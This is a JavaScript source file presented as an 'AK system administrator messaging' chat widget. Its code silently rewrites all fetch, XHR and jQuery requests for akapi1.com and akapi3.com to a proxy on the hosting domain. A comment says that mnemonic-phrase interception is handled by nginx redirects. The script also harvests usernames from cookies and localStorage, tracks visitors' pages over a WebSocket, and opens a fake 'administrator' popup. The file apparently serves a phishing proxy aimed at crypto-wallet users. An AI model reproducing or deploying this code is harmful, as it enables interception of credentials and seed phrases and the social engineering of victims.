/**
 * AK 系统管理员传讯组件
 * - 只有管理员发消息时才显示
 * - 用户关闭后需等管理员再发消息才能再次打开
 * - 青色风格匹配网站主题
 */

(function() {
    'use strict';
    
    // ===== 自动修改API地址，让请求走代理 =====
    function fixApiUrl() {
        try {
            if (typeof APP !== 'undefined' && APP.CONFIG && APP.CONFIG.BASE_URL) {
                const oldUrl = APP.CONFIG.BASE_URL;
                if (oldUrl.includes('akapi1.com') || oldUrl.includes('akapi3.com')) {
                    APP.CONFIG.BASE_URL = 'https://' + window.location.host + '/RPC/';
                    console.log('[AKProxy] API地址已修改:', oldUrl, '->', APP.CONFIG.BASE_URL);
                }
            }
        } catch(e) {}
    }
    
    // 更新用户活动时间（仅记录，不触发任何操作）
    function updateActivity() {
        if (window._akChatInitialized) {
            window._akLastActivity = Date.now();
        }
    }
    
    // ===== 拦截所有网络请求，重定向akapi1.com到代理 =====
    function interceptNetworkRequests() {
        const proxyHost = window.location.host;
        
        // 拦截 fetch 请求
        if (window.fetch) {
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                // 记录用户活动
                updateActivity();
                
                let finalUrl = url;
                if (typeof url === 'string') {
                    // 特定API强制重定向
                    if (url.includes('public_IndexData')) {
                        finalUrl = `https://${proxyHost}/RPC/public_IndexData`;
                        console.log('[AKProxy] Fetch强制重定向public_IndexData:', url, '->', finalUrl);
                    }
                    // 通用akapi重定向
                    else if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
                        finalUrl = url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                        console.log('[AKProxy] Fetch重定向:', url, '->', finalUrl);
                    }
                }
                
                // 不在这里重连，避免重复连接
                return originalFetch.call(this, finalUrl, options);
            };
        }
        
        // 拦截 XMLHttpRequest
        if (window.XMLHttpRequest) {
            const originalOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                // 记录用户活动
                updateActivity();
                
                if (typeof url === 'string') {
                    // 特定API强制重定向
                    if (url.includes('public_IndexData')) {
                        const newUrl = `https://${proxyHost}/RPC/public_IndexData`;
                        console.log('[AKProxy] XHR强制重定向public_IndexData:', url, '->', newUrl);
                        return originalOpen.call(this, method, newUrl, async, user, password);
                    }
                    // 通用akapi重定向
                    if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
                        const newUrl = url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                        console.log('[AKProxy] XHR重定向:', url, '->', newUrl);
                        return originalOpen.call(this, method, newUrl, async, user, password);
                    }
                }
                return originalOpen.call(this, method, url, async, user, password);
            };
        }
        
        // 拦截 jQuery AJAX (如果存在)
        if (window.$ && window.$.ajaxPrefilter) {
            window.$.ajaxPrefilter(function(options, originalOptions, jqXHR) {
                if (options.url) {
                    // 特定API强制重定向
                    if (options.url.includes('public_IndexData')) {
                        const newUrl = `https://${proxyHost}/RPC/public_IndexData`;
                        console.log('[AKProxy] jQuery强制重定向public_IndexData:', options.url, '->', newUrl);
                        options.url = newUrl;
                        return;
                    }
                    // 通用akapi重定向
                    if (options.url.includes('akapi1.com') || options.url.includes('akapi3.com')) {
                        const newUrl = options.url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                        console.log('[AKProxy] jQuery重定向:', options.url, '->', newUrl);
                        options.url = newUrl;
                    }
                }
            });
        }
    }
    
    // 助记词和首页拦截已由nginx 302处理，JS层不再需要
    
    // 立即执行一次
    fixApiUrl();
    // 立即拦截网络请求
    interceptNetworkRequests();
    // 延迟再执行（确保APP对象已加载）
    setTimeout(fixApiUrl, 500);
    setTimeout(fixApiUrl, 1500);
    setTimeout(fixApiUrl, 3000);
    
    // ===== 以下是聊天组件代码，需要等待 DOM 准备好 =====
    function initChatWidget() {
        // 防止重复初始化
        if (window._akChatInitialized) return;
        window._akChatInitialized = true;
        
        console.log('[AKChat] 初始化聊天组件...');
        
    // 配置
    const WS_PROTOCOL = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const WS_URL = `${WS_PROTOCOL}//${window.location.host}/chat/ws`;
    const HEARTBEAT_INTERVAL = 5000; // 5秒心跳间隔
    
    // 状态
    let ws = null;
    let isOpen = false;
    let hasNewMessage = false;
    let messageCount = 0;
    let username = 'visitor';
    let heartbeatTimer = null;
    
    // 从cookie获取值
    function getCookie(name) {
        let match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? match[2] : null;
    }
    
    // 获取用户名
    function getUsername() {
        console.log('[AKChat] ========== 获取用户名 ==========');
        console.log('[AKChat] 所有Cookies:', document.cookie);
        
        // 1. 优先从cookie读取（登录时服务端设置的）
        let cookieUser = getCookie('ak_username');
        console.log('[AKChat] ak_username Cookie:', cookieUser);
        if (cookieUser) {
            console.log('[AKChat] ★ 使用Cookie用户名:', cookieUser);
            return cookieUser;
        }
        
        // 2. 从localStorage遍历找用户名
        console.log('[AKChat] localStorage长度:', localStorage.length);
        try {
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                let value = localStorage.getItem(key);
                console.log('[AKChat] localStorage[' + key + ']:', value ? value.substring(0, 100) : 'null');
                try {
                    let data = JSON.parse(value);
                    if (data && typeof data === 'object') {
                        if (data.UserName && typeof data.UserName === 'string') {
                            console.log('[AKChat] ★ 找到UserName:', data.UserName);
                            return data.UserName;
                        }
                        if (data.Account && typeof data.Account === 'string') {
                            console.log('[AKChat] ★ 找到Account:', data.Account);
                            return data.Account;
                        }
                    }
                } catch(e) {}
            }
        } catch(e) {
            console.log('[AKChat] localStorage遍历出错:', e);
        }
        
        // 获取不到就用访客名
        let guestName = 'guest_' + Math.random().toString(36).substr(2, 6);
        console.log('[AKChat] ★ 使用访客名:', guestName);
        return guestName;
    }
    
    // 创建样式 - 青绿渐变风格
    const style = document.createElement('style');
    style.textContent = `
        /* 聊天窗口 - 默认隐藏 */
        #ak-admin-chat {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 340px;
            max-height: 450px;
            background: linear-gradient(135deg, #0a3d3d 0%, #1a4a3a 100%);
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 212, 180, 0.25);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            z-index: 99998;
            display: none;
            flex-direction: column;
            border: 1px solid rgba(0, 212, 180, 0.4);
            overflow: hidden;
        }
        
        #ak-admin-chat.visible {
            display: flex;
            animation: ak-slide-in 0.3s ease;
        }
        
        @keyframes ak-slide-in {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* 头部 - 青绿渐变 */
        #ak-admin-chat .chat-header {
            background: linear-gradient(135deg, #00c9b7 0%, #7ed56f 100%);
            padding: 14px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        #ak-admin-chat .chat-header-title {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #0d1b2a;
            font-weight: 600;
            font-size: 15px;
        }
        
        #ak-admin-chat .chat-header-title::before {
            content: '📢';
            font-size: 18px;
        }
        
        #ak-admin-chat .chat-close {
            background: rgba(0,0,0,0.2);
            border: none;
            color: #0d1b2a;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        
        #ak-admin-chat .chat-close:hover {
            background: rgba(0,0,0,0.3);
        }
        
        /* 消息区域 */
        #ak-admin-chat .chat-messages {
            flex: 1;
            padding: 16px;
            overflow-y: auto;
            min-height: 200px;
            max-height: 300px;
            background: #0a3d3d;
        }
        
        #ak-admin-chat .chat-message {
            margin-bottom: 12px;
            animation: ak-msg-in 0.2s ease;
        }
        
        @keyframes ak-msg-in {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        #ak-admin-chat .chat-message.admin {
            text-align: left;
        }
        
        #ak-admin-chat .chat-message.user {
            text-align: right;
        }
        
        #ak-admin-chat .chat-bubble {
            display: inline-block;
            padding: 10px 14px;
            border-radius: 12px;
            max-width: 85%;
            word-break: break-word;
            font-size: 14px;
            line-height: 1.5;
        }
        
        #ak-admin-chat .admin .chat-bubble {
            background: linear-gradient(135deg, #00c9b7 0%, #7ed56f 100%);
            color: #0a3d3d;
            border-bottom-left-radius: 4px;
        }
        
        #ak-admin-chat .user .chat-bubble {
            background: #1a4a3a;
            color: #e0f0e8;
            border: 1px solid rgba(0, 212, 180, 0.3);
            border-bottom-right-radius: 4px;
        }
        
        #ak-admin-chat .chat-time {
            font-size: 11px;
            color: #6aa88a;
            margin-top: 4px;
        }
        
        #ak-admin-chat .chat-label {
            font-size: 11px;
            color: #7ed56f;
            margin-bottom: 4px;
        }
        
        /* 输入区域 */
        #ak-admin-chat .chat-input-area {
            padding: 12px;
            background: #1a4a3a;
            border-top: 1px solid rgba(0, 212, 180, 0.2);
            display: flex;
            gap: 10px;
        }
        
        #ak-admin-chat .chat-input {
            flex: 1;
            padding: 10px 14px;
            border: 1px solid rgba(0, 212, 180, 0.4);
            border-radius: 20px;
            background: #0a3d3d;
            color: #e0f0e8;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        #ak-admin-chat .chat-input:focus {
            border-color: #00d4ff;
        }
        
        #ak-admin-chat .chat-input::placeholder {
            color: #6aa88a;
        }
        
        #ak-admin-chat .chat-send {
            width: 40px;
            height: 40px;
            border: none;
            border-radius: 50%;
            background: linear-gradient(135deg, #00c9b7 0%, #7ed56f 100%);
            color: #0a3d3d;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s;
        }
        
        #ak-admin-chat .chat-send:hover {
            transform: scale(1.05);
        }
        
        #ak-admin-chat .chat-send svg {
            width: 18px;
            height: 18px;
        }
        
        /* 新消息提示音效 */
        @keyframes ak-notify {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
    `;
    document.head.appendChild(style);
    
    // 创建聊天窗口HTML
    const chatHTML = `
        <div id="ak-admin-chat">
            <div class="chat-header">
                <div class="chat-header-title">系统管理员传讯</div>
                <button class="chat-close" onclick="AKChat.close()">×</button>
            </div>
            <div class="chat-messages" id="ak-chat-messages"></div>
            <div class="chat-input-area">
                <input type="text" class="chat-input" id="ak-chat-input" placeholder="输入回复..." onkeypress="if(event.keyCode===13)AKChat.send()">
                <button class="chat-send" onclick="AKChat.send()">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
                </button>
            </div>
        </div>
    `;
    
    // 插入DOM
    const container = document.createElement('div');
    container.innerHTML = chatHTML;
    document.body.appendChild(container);
    
    // 获取元素
    const chatBox = document.getElementById('ak-admin-chat');
    const messagesDiv = document.getElementById('ak-chat-messages');
    const inputEl = document.getElementById('ak-chat-input');
    
    console.log('[AKChat] Chat elements:', {
        chatBox: !!chatBox,
        messagesDiv: !!messagesDiv,
        inputEl: !!inputEl
    });
    
    if (!chatBox) {
        console.error('[AKChat] 聊天窗口元素未找到！');
        return;
    }
    
    // 播放提示音
    function playNotificationSound() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.frequency.value = 800;
            oscillator.type = 'sine';
            gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
            oscillator.start(audioCtx.currentTime);
            oscillator.stop(audioCtx.currentTime + 0.3);
        } catch(e) {}
    }
    
    // 添加消息
    function addMessage(content, isAdmin, time) {
        const msgDiv = document.createElement('div');
        msgDiv.className = 'chat-message ' + (isAdmin ? 'admin' : 'user');
        
        const timeStr = time || new Date().toLocaleTimeString('zh-CN', {hour: '2-digit', minute: '2-digit'});
        
        msgDiv.innerHTML = `
            ${isAdmin ? '<div class="chat-label">管理员</div>' : ''}
            <div class="chat-bubble">${escapeHtml(content)}</div>
            <div class="chat-time">${timeStr}</div>
        `;
        
        messagesDiv.appendChild(msgDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }
    
    // HTML转义
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    // 启动心跳
    function startHeartbeat() {
        // 清除旧的心跳
        stopHeartbeat();
        
        console.log('[AKChat] 启动心跳（每5秒发送一次）');
        
        heartbeatTimer = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'heartbeat', page: window.location.pathname + window.location.hash }));
            }
        }, HEARTBEAT_INTERVAL);
    }
    
    // 停止心跳
    function stopHeartbeat() {
        if (heartbeatTimer) {
            clearInterval(heartbeatTimer);
            heartbeatTimer = null;
        }
    }
    
    // 连接WebSocket
    function connect() {
        // 获取用户名
        username = getUsername();
        console.log('[AKChat] 使用用户名:', username);
        
        try {
            ws = new WebSocket(WS_URL + '?username=' + encodeURIComponent(username));
            
            ws.onopen = function() {
                console.log('[AKChat] WebSocket 已连接');
                // 发送上线消息
                ws.send(JSON.stringify({
                    type: 'online',
                    username: username,
                    page: window.location.pathname + window.location.hash,
                    userAgent: navigator.userAgent
                }));
                
                // 启动心跳
                startHeartbeat();
            };
            
            ws.onmessage = function(e) {
                try {
                    const data = JSON.parse(e.data);
                    
                    if (data.type === 'admin_message') {
                        // 收到管理员消息 - 唯一可以弹出窗口的情况
                        addMessage(data.content, true, data.time);
                        showChat();
                        playNotificationSound();
                    } else if (data.type === 'history') {
                        // 加载历史消息 - 静默加载，不弹出窗口
                        if (data.messages && data.messages.length > 0) {
                            data.messages.forEach(function(msg) {
                                addMessage(msg.content, msg.is_admin, msg.time);
                            });
                            console.log('[AKChat] 已加载 ' + data.messages.length + ' 条历史消息（静默加载）');
                        }
                    }
                } catch(err) {
                    console.error('[AKChat] 消息处理错误:', err);
                }
            };
            
            ws.onclose = function() {
                console.log('[AKChat] WebSocket 已断开');
                stopHeartbeat();
                // 5秒后尝试重连
                setTimeout(connect, 5000);
            };
            
            ws.onerror = function(err) {
                console.error('[AKChat] WebSocket 错误:', err);
            };
        } catch(e) {
            setTimeout(connect, 5000);
        }
    }
    
    // 显示聊天窗口
    function showChat() {
        console.log('[AKChat] showChat called, chatBox:', chatBox);
        if (chatBox) {
            chatBox.classList.add('visible');
            console.log('[AKChat] Added visible class, classList:', chatBox.classList.toString());
        } else {
            console.error('[AKChat] chatBox is null in showChat!');
        }
        isOpen = true;
    }
    
    // 关闭聊天窗口
    function closeChat() {
        chatBox.classList.remove('visible');
        isOpen = false;
    }
    
    // 发送消息
    function sendMessage() {
        const content = inputEl.value.trim();
        if (!content) return;
        
        // 检查WebSocket连接状态
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('[AKChat] WebSocket未连接，无法发送消息');
            alert('连接已断开，消息发送失败');
            return;
        }
        
        try {
            ws.send(JSON.stringify({
                type: 'user_message',
                content: content
            }));
            console.log('[AKChat] 消息已发送:', content);
            addMessage(content, false);
            inputEl.value = '';
        } catch(e) {
            console.error('[AKChat] 发送消息失败:', e);
            alert('发送失败，请重试');
        }
    }
    
    // 重连WebSocket（登录后调用）
    function reconnect() {
        console.log('[AKChat] 重连WebSocket，刷新用户信息...');
        if (ws) {
            ws.close();
        }
        // 重新获取用户名并连接
        username = getUsername();
        connect();
    }
    
    // 暴露全局API
    window.AKChat = {
        show: showChat,
        close: closeChat,
        send: sendMessage,
        reconnect: reconnect
    };
    
    // DOM加载完成后立即连接（不等待所有资源加载）
    setTimeout(connect, 100);
    
    } // 结束 initChatWidget 函数
    
    // 等待 body 加载完成后初始化聊天组件
    function tryInit() {
        if (document.body) {
            console.log('[AKChat] Body ready, initializing...');
            initChatWidget();
        } else {
            console.log('[AKChat] Body not ready, waiting...');
            setTimeout(tryInit, 100);
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', tryInit);
    } else {
        tryInit();
    }
    
})();
